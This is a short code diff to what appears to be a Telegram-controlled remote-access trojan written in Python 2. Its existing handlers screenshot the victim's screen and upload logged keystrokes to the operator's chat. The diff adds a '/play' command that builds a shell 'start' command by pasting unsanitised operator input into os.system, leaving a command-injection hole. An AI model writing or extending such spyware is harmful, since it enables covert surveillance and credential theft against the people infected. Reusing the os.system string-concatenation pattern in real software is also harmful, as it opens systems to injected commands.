@@ -70,7 +70,6 @@ def pressed_chars(event):
 
 def handle(msg):
 	chat_id = msg['chat']['id']
-	print('')
 
 	if checkchat_id(chat_id):
 		print msg
@@ -84,6 +83,17 @@ def handle(msg):
 				bot.sendChatAction(chat_id, 'upload_photo')
 				bot.sendDocument(chat_id, open('screenshot.jpg', 'rb'))
 				os.remove('screenshot.jpg')
+
+			elif command.startswith('/play'):
+				command = command.replace('/play ', '')
+				systemCommand = 'start \"\" \"https://www.youtube.com/embed/'
+				systemCommand += command
+				systemCommand += '?autoplay=1&showinfo=0&controls=0\"'
+				print systemCommand
+				if os.system(systemCommand) == 0:
+					bot.sendMessage(chat_id, 'YouTube video is now playing')
+				else:
+					bot.sendMessage(chat_id, 'Failed playing YouTube video')
 
 			elif command == '/keylogs':
 				bot.sendChatAction(chat_id, 'upload_document')
